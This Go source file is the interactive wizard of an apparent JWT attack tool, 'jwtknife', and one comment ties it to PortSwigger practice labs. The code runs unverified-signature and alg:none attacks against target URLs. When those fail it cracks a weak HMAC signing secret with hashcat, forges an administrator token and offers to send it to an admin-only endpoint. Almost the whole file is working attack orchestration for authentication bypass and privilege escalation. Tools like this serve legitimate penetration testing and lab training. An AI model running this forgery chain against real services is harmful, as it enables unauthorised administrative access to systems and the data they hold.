package wizard

import (
	"bufio"
	"fmt"
	"io"
	"net/url"
	"strings"
	"time"

	jwta "jwtknife/internal/attacks/jwt"
	"jwtknife/internal/hmac"
	"jwtknife/internal/httpx"
	"jwtknife/internal/jwtknifejwt"
	"jwtknife/internal/report"
)

func Run(cfg Config, in io.Reader, out io.Writer) (*report.Run, error) {
	rd := bufio.NewReader(in)

	fmt.Fprintln(out, "jwtknife – Phase 0 (setup) + Phase 1 (JWT auth testing)\n")

	// JWT input
	if strings.TrimSpace(cfg.RawJWT) == "" {
		j, _ := promptLine(rd, out, "Paste the JWT (you can include 'Bearer '): ")
		cfg.RawJWT = strings.TrimSpace(j)
	}
	cfg.RawJWT = strings.TrimSpace(strings.TrimPrefix(cfg.RawJWT, "Bearer "))

	parsed, err := jwtknifejwt.Parse(cfg.RawJWT)
	if err != nil {
		return nil, err
	}

	run := report.NewRun(time.Now())

	// Fill report JWT fields (these exist in your codebase since PrintHuman shows them)
	run.JWT.Raw = cfg.RawJWT
	run.JWT.Alg = parsed.Alg
	run.JWT.HasKid = parsed.HasKid
	run.JWT.Kid = parsed.Kid

	fmt.Fprintln(out, "\nDecoded JWT:")
	fmt.Fprintf(out, "  alg: %s\n", parsed.Alg)
	if parsed.HasKid {
		fmt.Fprintf(out, "  kid: %s\n", parsed.Kid)
	}

	/* ================= JWT placement ================= */

	fmt.Fprintln(out, "\nWhere is the JWT sent?")
	fmt.Fprintln(out, "  1) Authorization: Bearer <token>")
	fmt.Fprintln(out, "  2) Cookie")
	fmt.Fprintln(out, "  3) Custom header")
	fmt.Fprintln(out, "  4) I don't know (default Authorization)")
	c, _ := promptLine(rd, out, "Choose [1-4]: ")
	c = strings.TrimSpace(c)

	var placement httpx.JWTPlacement
	switch c {
	case "2":
		name, _ := promptLine(rd, out, "Cookie name: ")
		placement = httpx.JWTPlacement{Kind: httpx.PlaceCookie, Name: strings.TrimSpace(name)}
	case "3":
		name, _ := promptLine(rd, out, "Header name: ")
		placement = httpx.JWTPlacement{Kind: httpx.PlaceHeader, Name: strings.TrimSpace(name)}
	default:
		placement = httpx.JWTPlacement{Kind: httpx.PlaceAuthorizationBearer}
	}

	/* ================= URLs ================= */

	pubURL := mustURL(promptLine(rd, out, "Public URL (no auth required): "))
	authURL := mustURL(promptLine(rd, out, "JWT-required URL: "))
	adminURL := mustURL(promptLine(rd, out, "Admin-only URL: "))
	cbURL, _ := promptLine(rd, out, "Callback base URL (optional): ")
	cbURL = strings.TrimSpace(cbURL)
	run.CallbackBaseURL = cbURL

	/* ================= Phase 0 ================= */

	fmt.Fprintln(out, "\nPhase 0: Baseline requests")
	run.Baseline = report.NewBaseline()

	client := httpx.NewClient(httpx.ClientOpts{
		Timeout:         10 * time.Second,
		FollowRedirects: false,
		MaxRequests:     50,
	})

	run.Baseline.Public = report.FromHTTPResult(client.Do(httpx.RequestPlan{
		Label:     "public",
		URL:       pubURL.String(),
		Method:    "GET",
		JWT:       cfg.RawJWT,
		Placement: placement,
	}))

	run.Baseline.Auth = report.FromHTTPResult(client.Do(httpx.RequestPlan{
		Label:     "auth",
		URL:       authURL.String(),
		Method:    "GET",
		JWT:       cfg.RawJWT,
		Placement: placement,
	}))

	run.Baseline.Admin = report.FromHTTPResult(client.Do(httpx.RequestPlan{
		Label:     "admin",
		URL:       adminURL.String(),
		Method:    "GET",
		JWT:       cfg.RawJWT,
		Placement: placement,
	}))

	/* ================= Phase 1 ================= */

	fmt.Fprintln(out, "\nPhase 1: JWT auth attacks")
	run.JWTAttacks = []report.AttackResult{}

	targets := httpx.Targets{
		PublicURL: pubURL.String(),
		AuthURL:   authURL.String(),
		AdminURL:  adminURL.String(),
		Method:    "GET",
		Placement: placement,
	}

	attackInput := jwta.AttackInput{
		ParsedJWT: parsed,
		RawJWT:    cfg.RawJWT,
		Targets:   targets,
		Client:    client,
		Baseline:  run.Baseline,
		Callback:  cbURL,
	}

	run.JWTAttacks = append(run.JWTAttacks,
		jwta.NewUnverifiedSignatureAttack().Run(attackInput),
	)
	run.JWTAttacks = append(run.JWTAttacks,
		jwta.NewAlgNoneAttack().Run(attackInput),
	)

	run.AuthState = report.EvaluateAuthState(run.Baseline, run.JWTAttacks)

	/* ================= Phase 2/3: HMAC ================= */

	if strings.HasPrefix(parsed.Alg, "HS") && run.AuthState != "admin" {
		fmt.Fprintln(out, "\nDetected HMAC-signed JWT with enforced signature.")
		fmt.Fprintln(out, "Attempt weak HMAC secret recovery?")
		fmt.Fprintln(out, "  1) Built-in common secrets")
		fmt.Fprintln(out, "  2) Custom wordlist (hashcat)")
		fmt.Fprintln(out, "  3) Skip")

		choice, _ := promptLine(rd, out, "Choose [1-3]: ")
		choice = strings.TrimSpace(choice)

		if choice == "1" || choice == "2" {
			var wordlist string
			if choice == "2" {
				wordlist, _ = promptLine(rd, out, "Path to wordlist: ")
				wordlist = strings.TrimSpace(wordlist)
			}

			fmt.Fprintln(out, "\nRunning hashcat to recover HMAC secret...")
			secret, err := hmac.RecoverSecret(cfg.RawJWT, parsed.Alg, wordlist)
			if err != nil {
				fmt.Fprintf(out, "[-] HMAC recovery failed: %v\n", err)
				return run, nil
			}
			if strings.TrimSpace(secret) == "" {
				fmt.Fprintln(out, "[-] HMAC recovery failed: no HMAC secret found")
				return run, nil
			}

			fmt.Fprintf(out, "[+] HMAC secret recovered: %s\n", secret)

			// PortSwigger labs: admin user is typically "administrator"
			forged, err := hmac.SignWithSecret(parsed, secret, map[string]any{
				"sub": "administrator",
			})
			if err != nil {
				fmt.Fprintf(out, "[-] Failed to forge admin JWT: %v\n", err)
				return run, nil
			}

			fmt.Fprintln(out, "\n[+] Forged admin JWT:")
			fmt.Fprintln(out, forged)

			/* ================= Post-forge menu ================= */

			for {
				fmt.Fprintln(out, "\nWhat do you want to do now?")
				fmt.Fprintln(out, "  1) Print token only")
				fmt.Fprintln(out, "  2) Send admin request now (GET)")
				fmt.Fprintln(out, "  3) Exit")
				m, _ := promptLine(rd, out, "Choose [1-3]: ")
				m = strings.TrimSpace(m)

				switch m {
				case "1":
					fmt.Fprintln(out, "\n[+] Forged admin JWT:")
					fmt.Fprintln(out, forged)
				case "2":
					fmt.Fprintln(out, "\n[+] Sending admin request with forged token...")
					res := client.Do(httpx.RequestPlan{
						Label:     "admin-forged",
						URL:       adminURL.String(),
						Method:    "GET",
						JWT:       forged,
						Placement: placement,
					})
					fmt.Fprintf(out, "[+] admin-forged http=%d (body=%d bytes)\n", res.Status, res.BodyLen)
				default:
					return run, nil
				}
			}
		}
	}

	return run, nil
}

/* ================= helpers ================= */

func promptLine(rd *bufio.Reader, out io.Writer, q string) (string, error) {
	fmt.Fprint(out, q)
	s, err := rd.ReadString('\n')
	if err != nil && err != io.EOF {
		return "", err
	}
	return strings.TrimRight(s, "\r\n"), nil
}

func mustURL(s string, err error) *url.URL {
	if err != nil {
		return nil
	}
	u, _ := url.Parse(strings.TrimSpace(s))
	return u
}
